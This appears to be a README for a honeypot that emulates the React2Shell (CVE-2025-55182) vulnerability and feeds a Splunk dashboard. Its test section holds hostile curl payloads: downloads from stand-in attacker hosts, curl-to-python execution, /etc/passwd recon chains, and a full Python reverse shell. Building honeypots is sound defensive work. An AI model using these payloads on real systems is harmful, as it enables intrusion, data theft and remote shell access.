# React2Shell Honeypot (CVE-2025-55182)
A low-interaction, high-fidelity honeypot designed to detect and log exploitation attempts targeting **CVE-2025-55182 (React2Shell)**, a critical Remote Code Execution vulnerability in Next.js/React Server Components.

Note: 95% developed by Gemini Pro

## ⚠️ Disclaimer
**This software is for educational and research purposes only.**
While this honeypot is designed to be secure by using emulation rather than actual execution, **never deploy this on your internal corporate network or home LAN.** Use a strictly isolated environment (e.g., a cloud VPS with no sensitive data or SSH keys).

---

## 🛡️ Security Architecture
**No Code Execution:** The script uses Regex to parse incoming payloads. It extracts commands (like `wget`) as strings but **never executes them**.
* **Defanged Logs:** Malicious URLs captured are automatically "defanged" (e.g., `http` -> `hxxp`).
* **Container Hardening:** Runs with a read-only filesystem and drops all root capabilities.
* **JSON Logging:** Outputs structured JSON logs suitable for SIEM ingestion.

---

## 🛠️ Installation Guide
### 1. Update System & Install Docker
```bash
sudo apt-get update
sudo apt-get install -y docker.io python3-pip
```

### 2. Create Project Directory
```bash
mkdir -p ~/react2shell_honey/logs
cd ~/react2shell_honey
```

### 3. Create the Honeypot Script (`app.py`)
app.py from this repository

### 4. Create `Dockerfile`
dockerfile from this repository.

## 🏗️ Build & Deploy
### 1. Build the Image
```bash
sudo docker build -t react2shell-honey .

```

### 2. Prepare Log File Permissions (Critical)
Before running, create the log file on the host so the container has permission to write to it.

```bash
touch logs/honeypot.json
chmod 666 logs/honeypot.json

```

### 3. Run the Container
We run on Port **8080** to avoid conflicts with existing services.

```bash
sudo docker run -d \
  -p 8080:8080 \
  -v $(pwd)/logs:/var/log \
  --read-only \
  --cap-drop=ALL \
  --env PYTHONDONTWRITEBYTECODE=1 \
  --name react_honey \
  react2shell-honey

```

---

## 🧪 Verification
Test the honeypot from a local terminal:
These commands are pre-formatted with **URL encoding** (e.g., `%20` for spaces) to prevent the `curl` errors. They cover different attack vectors to populate all sections of the splunk dashboard.

### 1. Test Vulnerability Probe
```
curl -X POST http://IP:8080/ -d '["$1:a:a"]'
```
Expected: 500 Error with E{"digest":...}

### 2. Test RCE Detection
```
curl -X POST http://IP:8080/ -d '["$1:a:a"]; wget http://evil.com/malware.sh'
```
Expected: Fake download progress bar

### 3. Basic Port Scan (Noise)
```
nmap -sS -p 80,443,8080 <Target_IP>
```
### 4. Web Crawler / Spidering (User-Agent Testing)
```
curl -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" http://IP:8080/admin
```
### 5. Injecting a command to download a remote file
```
curl "http://8080/index.php?cmd=wget%20http://evil.com/shell.sh"
```
### 6. Using curl with a pipe to bash
```
curl "http://IP:8080/index.php?cmd=;%20curl%20http://192.168.1.50/malware.py%20|%20python3"
```
### 7. Using semicolons to chain commands
```
curl -X POST http://IP:8080/api/upload -d "file=test;%20id;%20whoami;%20cat%20/etc/passwd"
```
### 8. Regex & Evasion Testing
Defanged URLs (hxxp)
Verifies the `(http|https|hxxp)` regex group.
```
curl "http://IP:8080/?input=;%20wget%20hxxp://malware-site.com/loader.bin"

```
### 9. Regex & Evasion Testing
FTP Protocol
Verifies the `ftp` protocol inclusion.

```curl "http://IP:8080/search?q=;%20wget%20ftp://10.10.10.5/payload.exe"
```
### 10. Regex & Evasion Testing
Whitespace Noise (The "Split" Test)
Verifies that the `\S+` regex stops correctly at the whitespace.
The regex should grab ONLY the URL, not the trailing flags
```
curl "http://IP:8080/cmd?run=wget%20http://attacker.com/rootkit.tar.gz%20-O%20/tmp/evil"

```
### 11. The "Downloader" Attack (Wget)

* **Goal:** Test if the **Red "Critical Alerts"** panel increments.
* **Dashboard Check:** Look for the URL `http://evil-server.com/shell.sh` in the "Malware URL" column.

```
curl "http://IP:8080/index.php?cmd=wget%20http://evil-server.com/shell.sh"

```

### 12. The "System Recon" Attack (Chained Commands)

* **Goal:** Test your **Fallback Logic**. Since there is no URL, the dashboard should display the raw command.
* **Dashboard Check:** The "Malware URL / Payload" column should show: `id; whoami; cat /etc/passwd`.

```
curl "http://IP:8080/index.php?cmd=;%20id;%20whoami;%20cat%20/etc/passwd"

```

### 13. The "File Upload" Attack (POST Request)

* **Goal:** Test the `/api/upload` endpoint you configured.
* **Dashboard Check:** Verifies that your parser handles `POST` body data correctly.

```
curl -X POST http://iP:8080/api/upload -d "file=innocent.jpg;%20chmod%20+x%20malware.py;%20./malware.py"

```

### 14. The "Evasion" Attack (Defanged URL)

* **Goal:** Test if your Regex correctly grabs `hxxp` (a common way attackers hide links).
* **Dashboard Check:** The "Malware URL" column should extract `hxxp://hidden-c2.com/loader.bin`.

```
curl "http://IP:8080/index.php?cmd=;%20curl%20hxxp://hidden-c2.com/loader.bin%20-o%20/tmp/loader"

```

### 15. The "Python Reverse Shell" Attack

* **Goal:** Simulate a complex, real-world payload.
* **Dashboard Check:** Should show the full python command in the payload column.

```
curl -g "http:IP:8080/index.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.0.1%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27"

```


## How to verify in Splunk

After running these, refresh your dashboard. You should see:

1. **Critical Alerts:** Count should increase.
2. **Attack Volume:** New bars appearing in the chart.
3. **Payload Table:** You should see a mix of clean URLs and raw commands.

## 📊 Viewing Logs
```bash
tail -f logs/honeypot.json

```

##📊 Splunk
Create a new dashboard from source code as described in this repository.
